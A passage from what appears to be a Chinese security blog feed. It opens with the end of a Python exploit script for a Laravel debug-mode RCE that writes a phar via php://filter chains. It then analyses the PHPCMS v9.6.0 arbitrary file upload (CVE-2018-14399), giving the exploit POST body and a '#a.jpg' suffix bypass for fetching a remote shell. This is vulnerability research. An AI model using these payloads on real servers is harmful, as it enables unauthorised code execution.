class="hljs-title">getphar</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    <span class="hljs-keyword">global</span> url, headers, vul_json</span><br><span class="line">    <span class="hljs-comment"># while True:</span></span><br><span class="line">    clearLog()</span><br><span class="line">    vul_json[<span class="hljs-string">&quot;parameters&quot;</span>][<span class="hljs-string">&quot;viewFile&quot;</span>] = <span class="hljs-string">&quot;AA&quot;</span></span><br><span class="line">    res1 = requests.post(url, headers=headers, json=vul_json, verify=<span class="hljs-literal">False</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-string">&apos;file_get_contents(AA)&apos;</span> <span class="hljs-keyword">in</span> res1.text:</span><br><span class="line">        vul_json[<span class="hljs-string">&quot;parameters&quot;</span>][<span class="hljs-string">&quot;viewFile&quot;</span>] = <span class="hljs-string">&quot;=55=00=45=00=46=00=5A=00=54=00=45=00=39=00=42=00=52=00=41=00=3D=00=3D=00&quot;</span></span><br><span class="line">        res2 = requests.post(url, headers=headers, json=vul_json, verify=<span class="hljs-literal">False</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-string">&apos;file_get_contents(&apos;</span> <span class="hljs-keyword">in</span> res2.text:</span><br><span class="line">            vul_json[<span class="hljs-string">&quot;parameters&quot;</span>][<span class="hljs-string">&quot;viewFile&quot;</span>] = <span class="hljs-string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span><br><span class="line">            res3 = requests.post(url, headers=headers, json=vul_json, verify=<span class="hljs-literal">False</span>)</span><br><span class="line">            <span class="hljs-keyword">if</span> res3 <span class="hljs-keyword">and</span> res3.status_code == <span class="hljs-number">200</span>:</span><br><span class="line">                print(<span class="hljs-string">&quot;phar write&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:</span><br><span class="line">    getphar()</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x540E;&#x6765;&#x8DDF; @lihuaiqiu &#x548C; @decade &#x4EA4;&#x6D41; MAMP &#x73AF;&#x5883;&#x5931;&#x8D25;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x53D1;&#x73B0;&#x662F; MAMP &#x6CA1;&#x6709;&#x76F8;&#x5173;&#x7684;&#x6269;&#x5C55;</p>
<p><img src="/2021/01/18/Laravel-v8-4-2-debug-mode-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210209175439934.png" alt="image-20210209175439934"></p>
<h3 id="Talking-to-PHP-FPM-using-FTP"><a href="#Talking-to-PHP-FPM-using-FTP" class="headerlink" title="Talking to PHP-FPM using FTP"></a>Talking to PHP-FPM using FTP</h3><p>&#x601D;&#x8DEF;&#x5F88;&#x4E0D;&#x9519;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x8FD9;&#x4E24;&#x7BC7;&#x6587;&#x7AE0;</p>
<ul>
<li><a href="https://www.anquanke.com/post/id/226750#h2-0" target="_blank" rel="noopener">https://www.anquanke.com/post/id/226750#h2-0</a></li>
<li><a href="https://security.immomo.com/blog/15" target="_blank" rel="noopener">https://security.immomo.com/blog/15</a></li>
</ul>
<p>&#x672C;&#x5730;&#x590D;&#x73B0;&#x7684;&#x65F6;&#x5019;&#x5F39;&#x4E0D;&#x4E86;shell&#x56DE;&#x6765;</p>
<p><img src="/2021/01/18/Laravel-v8-4-2-debug-mode-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210123152707425.png" alt="image-20210123152707425"></p>
<p>REF</p>
<p><a href="https://zhuanlan.zhihu.com/p/344568679" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/344568679</a></p>
<p><a href="https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g</a></p>
</body></html>]]></content>
      <categories>
        <category>PHP Sec</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Laravel</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPCMS v9.6.0 两个漏洞分析</title>
    <url>/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<html><head></head><body><p>&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF08;CVE-2018-14399&#xFF09; + wap&#x6A21;&#x5757; SQL&#x6CE8;&#x5165;</p>
<a id="more"></a>



<h2 id="&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF08;CVE-2018-14399&#xFF09;"><a href="#&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF08;CVE-2018-14399&#xFF09;" class="headerlink" title="&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF08;CVE-2018-14399&#xFF09;"></a>&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF08;CVE-2018-14399&#xFF09;</h2><h3 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"><a href="#&#x6F0F;&#x6D1E;&#x590D;&#x73B0;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"></a>&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h3><p><strong>&#x6F0F;&#x6D1E;&#x5371;&#x5BB3;&#xFF1A;&#x8BE5;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x5728;&#x7528;&#x6237;&#x6CE8;&#x518C;&#x754C;&#x9762;&#x4EE5;&#x672A;&#x6388;&#x6743;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x3002;</strong></p>
<p>&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x4F4D;&#x7F6E;&#x5728; &#x4F1A;&#x5458;&#x6CE8;&#x518C; &#x8FD9;&#x4E2A;&#x754C;&#x9762;&#x3002;&#x5730;&#x5740;&#x4E3A; <code>ip/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1</code><br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6OIr5YgRujmoJa1-20201117115107536.jpg" alt></p>
<p>POST&#x53C2;&#x6570;&#x5982;&#x4E0B;</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">siteid=1&amp;modelid=11&amp;username=P2hm1n&amp;password=P2hm1n&amp;email=123456@qq.com&amp;info[content]=&lt;img src=&#x4F60;&#x7684;shell&gt;&amp;dosubmit=1&amp;protocol=</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/gfY8KknGSrRtO7M-20201117115107490.jpg" alt></p>
<p>&#x8BBF;&#x95EE;&#x7206;&#x51FA;&#x4E0A;&#x4F20;&#x5730;&#x5740;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/pMFCXVQycNb6RjU-20201117115107549.jpg" alt></p>
<p>&#x80FD;shell</p>
<p><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/BUloO1A9ujR256I-20201117115107256.png" alt></p>
<h3 id="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"><a href="#&#x6F0F;&#x6D1E;&#x5206;&#x6790;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"></a>&#x6F0F;&#x6D1E;&#x5206;&#x6790;</h3><p>&#x6587;&#x4EF6;&#x76EE;&#x5F55; <code>phpcms/modules/member/index.php</code></p>
<p><code>index.php</code> &#x5927;&#x81F4;&#x5B9E;&#x73B0;&#x529F;&#x80FD;&#xFF1A;&#x4F1A;&#x5458;&#x524D;&#x53F0;&#x7BA1;&#x7406;&#x4E2D;&#x5FC3;&#x3001;&#x8D26;&#x53F7;&#x7BA1;&#x7406;&#x3001;&#x6536;&#x85CF;&#x64CD;&#x4F5C;&#x7C7B;</p>
<p>&#x89E6;&#x53D1;&#x6F0F;&#x6D1E;&#x70B9;&#x65B9;&#x6CD5;&#x662F; <code>register</code> &#x5927;&#x81F4;&#x903B;&#x8F91;&#x662F; &#x83B7;&#x53D6;&#x7528;&#x6237;siteid&#xFF0C;&#x5B9A;&#x4E49;&#x7AD9;&#x70B9;id&#x5E38;&#x91CF;&#xFF0C;&#x52A0;&#x8F7D;&#x7528;&#x6237;&#x6A21;&#x5757;&#x914D;&#x7F6E;&#xFF0C;&#x52A0;&#x8F7D;&#x77ED;&#x4FE1;&#x6A21;&#x5757;&#x914D;&#x7F6E;</p>
<p>&#x7B2C; 134-135 &#x884C; &#x53D1;&#x73B0;&#x53EF;&#x63A7;&#x53D8;&#x91CF; <code>$_POST[&#x2018;info&#x2019;]</code> &#x7ECF;&#x8FC7;&#x6F0F;&#x6D1E;&#x590D;&#x73B0;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x8FD9;&#x662F; exp &#x7684;&#x5173;&#x952E;&#x53C2;&#x6570;</p>
<p>&#x5148;&#x770B; 134 &#x884C;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x5C06; <code>$_POST[&#x2018;info&#x2019;]</code> &#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x7ECF;&#x8FC7;&#x4E86;<code>new_html_special_chars</code>&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x8FC7;&#x6EE4;&#x3002;&#x8DDF;&#x8FDB;&#x51FD;&#x6570;&#x5206;&#x6790;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment"> * &#x8FD4;&#x56DE;&#x7ECF;addslashe&#x5904;&#x7406;&#x8FC7;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x6216;&#x6570;&#x7EC4;</span></span><br><span class="line"><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> $obj &#x9700;&#x8981;&#x5904;&#x7406;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x6216;&#x6570;&#x7EC4;</span></span><br><span class="line"><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> mixed</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">new_html_special_chars</span><span class="hljs-params">($string)</span> </span>{</span><br><span class="line">	$encoding = <span class="hljs-string">&apos;utf-8&apos;</span>;</span><br><span class="line">	<span class="hljs-keyword">if</span>(strtolower(CHARSET)==<span class="hljs-string">&apos;gbk&apos;</span>) $encoding = <span class="hljs-string">&apos;gb2312&apos;</span>;</span><br><span class="line">	<span class="hljs-keyword">if</span>(!is_array($string)) <span class="hljs-keyword">return</span> htmlspecialchars($string,ENT_COMPAT,$encoding);</span><br><span class="line">	<span class="hljs-keyword">foreach</span>($string <span class="hljs-keyword">as</span> $key =&gt; $val) $string[$key] = new_html_special_chars($val);</span><br><span class="line">	<span class="hljs-keyword">return</span> $string;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4E3B;&#x8981;&#x529F;&#x80FD;&#x662F;&#x505A;&#x4E86; html &#x8F6C;&#x4E49;&#x3002;&#x5BF9;&#x6211;&#x4EEC;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x6CA1;&#x6709;&#x592A;&#x5927;&#x963B;&#x788D;&#x3002;&#x63A5;&#x7740;&#x8DDF;&#x8FDB;&#x4E00;&#x4E0B; 135&#x884C;&#x7684; <code>$member_input-&gt;get()</code> &#x65B9;&#x6CD5;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5XIC1okjlf2PMJQ-20201117115108205.jpg" alt></p>
<p>&#x65B9;&#x6CD5;&#x4F4D;&#x7F6E;&#xFF1A;<code>caches/caches_model/caches_data/member_input.class.php</code></p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($data)</span> </span>{</span><br><span class="line">	<span class="hljs-keyword">$this</span>-&gt;data = $data = trim_script($data);</span><br><span class="line">	$model_cache = getcache(<span class="hljs-string">&apos;member_model&apos;</span>, <span class="hljs-string">&apos;commons&apos;</span>);</span><br><span class="line">	<span class="hljs-keyword">$this</span>-&gt;db-&gt;table_name = <span class="hljs-keyword">$this</span>-&gt;db_pre.$model_cache[<span class="hljs-keyword">$this</span>-&gt;modelid][<span class="hljs-string">&apos;tablename&apos;</span>];</span><br><span class="line"></span><br><span class="line">	$info = <span class="hljs-keyword">array</span>();</span><br><span class="line">	$debar_filed = <span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;catid&apos;</span>,<span class="hljs-string">&apos;title&apos;</span>,<span class="hljs-string">&apos;style&apos;</span>,<span class="hljs-string">&apos;thumb&apos;</span>,<span class="hljs-string">&apos;status&apos;</span>,<span class="hljs-string">&apos;islink&apos;</span>,<span class="hljs-string">&apos;description&apos;</span>);</span><br><span class="line">	<span class="hljs-keyword">if</span>(is_array($data)) {</span><br><span class="line">		<span class="hljs-keyword">foreach</span>($data <span class="hljs-keyword">as</span> $field=&gt;$value) {</span><br><span class="line">			<span class="hljs-keyword">if</span>($data[<span class="hljs-string">&apos;islink&apos;</span>]==<span class="hljs-number">1</span> &amp;&amp; !in_array($field,$debar_filed)) <span class="hljs-keyword">continue</span>;</span><br><span class="line">			$field = safe_replace($field);</span><br><span class="line">			$name = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;name&apos;</span>];</span><br><span class="line">			$minlength = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;minlength&apos;</span>];</span><br><span class="line">			$maxlength = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;maxlength&apos;</span>];</span><br><span class="line">			$pattern = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;pattern&apos;</span>];</span><br><span class="line">			$errortips = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;errortips&apos;</span>];</span><br><span class="line">			<span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($errortips)) $errortips = <span class="hljs-string">&quot;$name &#x4E0D;&#x7B26;&#x5408;&#x8981;&#x6C42;&#xFF01;&quot;</span>;</span><br><span class="line">			$length = <span class="hljs-keyword">empty</span>($value) ? <span class="hljs-number">0</span> : strlen($value);</span><br><span class="line">			<span class="hljs-keyword">if</span>($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(<span class="hljs-string">&quot;$name &#x4E0D;&#x5F97;&#x5C11;&#x4E8E; $minlength &#x4E2A;&#x5B57;&#x7B26;&#xFF01;&quot;</span>);</span><br><span class="line">			<span class="hljs-keyword">if</span> (!array_key_exists($field, <span class="hljs-keyword">$this</span>-&gt;fields)) showmessage(<span class="hljs-string">&apos;&#x6A21;&#x578B;&#x4E2D;&#x4E0D;&#x5B58;&#x5728;&apos;</span>.$field.<span class="hljs-string">&apos;&#x5B57;&#x6BB5;&apos;</span>);</span><br><span class="line">			<span class="hljs-keyword">if</span>($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) {</span><br><span class="line">				showmessage(<span class="hljs-string">&quot;$name &#x4E0D;&#x5F97;&#x8D85;&#x8FC7; $maxlength &#x4E2A;&#x5B57;&#x7B26;&#xFF01;&quot;</span>);</span><br><span class="line">			} <span class="hljs-keyword">else</span> {</span><br><span class="line">				str_cut($value, $maxlength);</span><br><span class="line">			}</span><br><span class="line">			<span class="hljs-keyword">if</span>($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips);</span><br><span class="line">            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;isunique&apos;</span>] &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;db-&gt;get_one(<span class="hljs-keyword">array</span>($field=&gt;$value),$field) &amp;&amp; ROUTE_A != <span class="hljs-string">&apos;edit&apos;</span>) showmessage(<span class="hljs-string">&quot;$name &#x7684;&#x503C;&#x4E0D;&#x5F97;&#x91CD;&#x590D;&#xFF01;&quot;</span>);</span><br><span class="line">			$func = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;formtype&apos;</span>];</span><br><span class="line">			<span class="hljs-keyword">if</span>(method_exists(<span class="hljs-keyword">$this</span>, $func)) $value = <span class="hljs-keyword">$this</span>-&gt;$func($field, $value);</span><br><span class="line"></span><br><span class="line">			$info[$field] = $value;</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">	<span class="hljs-keyword">return</span> $info;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x9996;&#x5148;&#x5C06; data &#x7ECF;&#x8FC7;&#x4E00;&#x4E2A; <code>trim_script</code> &#x7684;&#x5904;&#x7406;&#x3002;&#x4F46;&#x662F; <code>trim_script</code> &#x5927;&#x591A;&#x90FD;&#x662F;&#x5904;&#x7406; xss &#x6709;&#x5173;&#x6F0F;&#x6D1E;&#x7684;&#x8FC7;&#x6EE4;&#x3002;&#x51E0;&#x4E2A;&#x6B63;&#x5219;&#x5C06;xss&#x7684;&#x5173;&#x952E; payload &#x8FDB;&#x884C;&#x4E86;&#x66FF;&#x6362;</p>
<p><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/nqCsx4wp8uX2MWl-20201117115107457.png" alt></p>
<p>&#x7B2C;27&#x884C;&#xFF0C;&#x6838;&#x5FC3; if &#x5224;&#x65AD;&#x6761;&#x4EF6; <code>if(is_array($data))</code> &#x3002;&#x6211;&#x4EEC; payload &#x4E2D; <code>info[content]=&lt;img src=&#x4F60;&#x7684;shell&gt;</code> &#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;&#x3002;&#x56E0;&#x6B64;&#x7EE7;&#x7EED;&#x8DDF;&#x8FDB;&#xFF0C;&#x53D1;&#x73B0;&#x5C06;&#x6570;&#x7EC4;&#x8FDB;&#x884C;&#x904D;&#x5386;&#xFF0C;&#x952E;&#x540D;&#x4E3A;<code>$field</code>&#xFF0C;&#x952E;&#x503C;&#x4E3A;<code>$value</code></p>
<p>&#x7B2C;30&#x884C;&#xFF0C;<code>$field</code> &#x8FDB;&#x884C;&#x4E00;&#x6B21; <code>safe_replace</code> &#x5904;&#x7406;&#x3002;&#x4E3B;&#x8981;&#x8FC7;&#x6EE4;&#x4E00;&#x4E9B;&#x7C7B;&#x4F3C;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x5C16;&#x62EC;&#x53F7;&#x7B49;&#x53EF;&#x80FD;&#x4EA7;&#x751F; XSS&#xFF0C;SQL&#x6CE8;&#x5165;&#x7684;&#x7B26;&#x53F7;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/AJSbqUtg7T63PGZ-20201117115107732.png" alt="image.png"></p>
<p>&#x4E4B;&#x540E;&#x7ECF;&#x8FC7;&#x4E00;&#x4E9B;&#x6CE8;&#x518C;&#x65F6;&#x6B63;&#x5E38;&#x7684;&#x5224;&#x65AD;&#x903B;&#x8F91;&#x4EE3;&#x7801;</p>
<p>47-48&#x884C;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">$func = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;formtype&apos;</span>];</span><br><span class="line"><span class="hljs-keyword">if</span>(method_exists(<span class="hljs-keyword">$this</span>, $func)) $value = <span class="hljs-keyword">$this</span>-&gt;$func($field, $value);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5148;&#x662F;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A; <code>$func</code> &#xFF0C;&#x7136;&#x540E;&#x4E0B;&#x9762;&#x7684;if&#x8BED;&#x53E5;&#x5224;&#x65AD;&#x65B9;&#x6CD5;&#x5982;&#x679C;&#x5B58;&#x5728;&#x5C31;&#x5E26;&#x5165;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x3002;</p>
<p>&#x6328;&#x4E2A;&#x67E5;&#x770B;&#x65B9;&#x6CD5;&#x4E2D;&#xFF0C;&#x5728; <code>editor</code> &#x65B9;&#x6CD5;&#x4E2D; &#x7684;&#x4E00;&#x53E5;&#x8BDD;&#x3002;&#x8C03;&#x7528;&#x4E86; <code>attachment</code> &#x7C7B;&#x7684; <code>download</code> &#x51FD;&#x6570;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">$value = <span class="hljs-keyword">$this</span>-&gt;attachment-&gt;download(<span class="hljs-string">&apos;content&apos;</span>, $value,$watermark_enable);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x8DDF;&#x8FDB;&#x6587;&#x4EF6; <code>phpcms/libs/classes/attachment.class.php</code></p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">	 * &#x9644;&#x4EF6;&#x4E0B;&#x8F7D;</span></span><br><span class="line"><span class="hljs-comment">	 * Enter description here ...</span></span><br><span class="line"><span class="hljs-comment">	 * <span class="hljs-doctag">@param</span> $field &#x9884;&#x7559;&#x5B57;&#x6BB5;</span></span><br><span class="line"><span class="hljs-comment">	 * <span class="hljs-doctag">@param</span> $value &#x4F20;&#x5165;&#x4E0B;&#x8F7D;&#x5185;&#x5BB9;</span></span><br><span class="line"><span class="hljs-comment">	 * <span class="hljs-doctag">@param</span> $watermark &#x662F;&#x5426;&#x52A0;&#x5165;&#x6C34;&#x5370;</span></span><br><span class="line"><span class="hljs-comment">	 * <span class="hljs-doctag">@param</span> $ext &#x4E0B;&#x8F7D;&#x6269;&#x5C55;&#x540D;</span></span><br><span class="line"><span class="hljs-comment">	 * <span class="hljs-doctag">@param</span> $absurl &#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;</span></span><br><span class="line"><span class="hljs-comment">	 * <span class="hljs-doctag">@param</span> $basehref </span></span><br><span class="line"><span class="hljs-comment">	 */</span></span><br><span class="line">	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download</span><span class="hljs-params">($field, $value,$watermark = <span class="hljs-string">&apos;0&apos;</span>,$ext = <span class="hljs-string">&apos;gif|jpg|jpeg|bmp|png&apos;</span>, $absurl = <span class="hljs-string">&apos;&apos;</span>, $basehref = <span class="hljs-string">&apos;&apos;</span>)</span></span></span><br><span class="line"><span class="hljs-function">	</span>{</span><br><span class="line">		<span class="hljs-keyword">global</span> $image_d;</span><br><span class="line">		<span class="hljs-keyword">$this</span>-&gt;att_db = pc_base::load_model(<span class="hljs-string">&apos;attachment_model&apos;</span>);</span><br><span class="line">		$upload_url = pc_base::load_config(<span class="hljs-string">&apos;system&apos;</span>,<span class="hljs-string">&apos;upload_url&apos;</span>);</span><br><span class="line">		<span class="hljs-keyword">$this</span>-&gt;field = $field;</span><br><span class="line">		$dir = date(<span class="hljs-string">&apos;Y/md/&apos;</span>);</span><br><span class="line">		$uploadpath = $upload_url.$dir;</span><br><span class="line">		$uploaddir = <span class="hljs-keyword">$this</span>-&gt;upload_root.$dir;</span><br><span class="line">		$string = new_stripslashes($value);</span><br><span class="line">		<span class="hljs-keyword">if</span>(!preg_match_all(<span class="hljs-string">&quot;/(href|src)=([\&quot;|&apos;]?)([^ \&quot;&apos;&gt;]+\.($ext))\\2/i&quot;</span>, $string, $matches)) <span class="hljs-keyword">return</span> $value;</span><br><span class="line">		$remotefileurls = <span class="hljs-keyword">array</span>();</span><br><span class="line">		<span class="hljs-keyword">foreach</span>($matches[<span class="hljs-number">3</span>] <span class="hljs-keyword">as</span> $matche)</span><br><span class="line">		{</span><br><span class="line">			<span class="hljs-keyword">if</span>(strpos($matche, <span class="hljs-string">&apos;://&apos;</span>) === <span class="hljs-keyword">false</span>) <span class="hljs-keyword">continue</span>;</span><br><span class="line">			dir_create($uploaddir);</span><br><span class="line">			$remotefileurls[$matche] = <span class="hljs-keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">		}</span><br><span class="line">		<span class="hljs-keyword">unset</span>($matches, $string);</span><br><span class="line">		$remotefileurls = array_unique($remotefileurls);</span><br><span class="line">		$oldpath = $newpath = <span class="hljs-keyword">array</span>();</span><br><span class="line">		<span class="hljs-keyword">foreach</span>($remotefileurls <span class="hljs-keyword">as</span> $k=&gt;$file) {</span><br><span class="line">			<span class="hljs-keyword">if</span>(strpos($file, <span class="hljs-string">&apos;://&apos;</span>) === <span class="hljs-keyword">false</span> || strpos($file, $upload_url) !== <span class="hljs-keyword">false</span>) <span class="hljs-keyword">continue</span>;</span><br><span class="line">			$filename = fileext($file);</span><br><span class="line">			$file_name = basename($file);</span><br><span class="line">			$filename = <span class="hljs-keyword">$this</span>-&gt;getname($filename);</span><br><span class="line"></span><br><span class="line">			$newfile = $uploaddir.$filename;</span><br><span class="line">			$upload_func = <span class="hljs-keyword">$this</span>-&gt;upload_func;</span><br><span class="line">			<span class="hljs-keyword">if</span>($upload_func($file, $newfile)) {</span><br><span class="line">				$oldpath[] = $k;</span><br><span class="line">				$GLOBALS[<span class="hljs-string">&apos;downloadfiles&apos;</span>][] = $newpath[] = $uploadpath.$filename;</span><br><span class="line">				@chmod($newfile, <span class="hljs-number">0777</span>);</span><br><span class="line">				$fileext = fileext($filename);</span><br><span class="line">				<span class="hljs-keyword">if</span>($watermark){</span><br><span class="line">					watermark($newfile, $newfile,<span class="hljs-keyword">$this</span>-&gt;siteid);</span><br><span class="line">				}</span><br><span class="line">				$filepath = $dir.$filename;</span><br><span class="line">				$downloadedfile = <span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;filename&apos;</span>=&gt;$filename, <span class="hljs-string">&apos;filepath&apos;</span>=&gt;$filepath, <span class="hljs-string">&apos;filesize&apos;</span>=&gt;filesize($newfile), <span class="hljs-string">&apos;fileext&apos;</span>=&gt;$fileext);</span><br><span class="line">				$aid = <span class="hljs-keyword">$this</span>-&gt;add($downloadedfile);</span><br><span class="line">				<span class="hljs-keyword">$this</span>-&gt;downloadedfiles[$aid] = $filepath;</span><br><span class="line">			}</span><br><span class="line">		}</span><br><span class="line">		<span class="hljs-keyword">return</span> str_replace($oldpath, $newpath, $value);</span><br><span class="line">	}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x9996;&#x5148;&#x9650;&#x5236;&#x4E86;&#x5176;&#x4E2D; <code>$ext</code> &#x53EA;&#x5141;&#x8BB8;&#x4E3A;<code>gif|jpg|jpeg|bmp|png</code> </p>
<p>153&#x884C; &#x8FDB;&#x884C;&#x4E86;&#x4E00;&#x4E2A;&#x8FC7;&#x6EE4;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(!preg_match_all(<span class="hljs-string">&quot;/(href|src)=([\&quot;|&apos;]?)([^ \&quot;&apos;&gt;]+\.($ext))\\2/i&quot;</span>, $string, $matches)) <span class="hljs-keyword">return</span> $value;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x8FD9;&#x91CC;&#x5339;&#x914D;&#x4E86;<code>src</code>&#x6216;<code>href</code>&#x4E2D;&#x6587;&#x4EF6;&#x7684;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x4E0D;&#x8FC7;&#x540E;&#x7F00;&#x4E3A;<code>$ext</code>&#xFF0C;&#x5176;&#x4E2D;<code>$ext</code>&#x7684;&#x503C;&#x4E3A;&#xFF1A;<code>gif|jpg|jpeg|bmp|png</code></p>
<p><code>http://ip/p2hm1n.php#a.jpg</code> &#x5373;&#x53EF;&#x7ED5;&#x8FC7;&#x6B63;&#x5219;</p>
<p>158&#x884C; &#x4F7F;&#x7528;&#x4E86; <code>fillurl</code> &#x51FD;&#x6570;&#x8FDC;&#x7A0B;&#x52A0;&#x8F7D;&#x8D44;&#x6E90;&#xFF0C;&#x8FD8;&#x5427; # &#x4E4B;&#x540E;&#x7684;&#x5B57;&#x7B26;&#x5168;&#x90E8;&#x79FB;&#x9664;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">$pos = strpos($surl,<span class="hljs-string">&apos;#&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">if</span>($pos&gt;<span class="hljs-number">0</span>) $surl = substr($surl,<span class="hljs-number">0</span>,$pos);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><code>P2hm1n.php#a.jpg</code> &#x4F1A;&#x88AB;&#x5904;&#x7406;&#x6210; <code>P2hm1n.php</code></p>
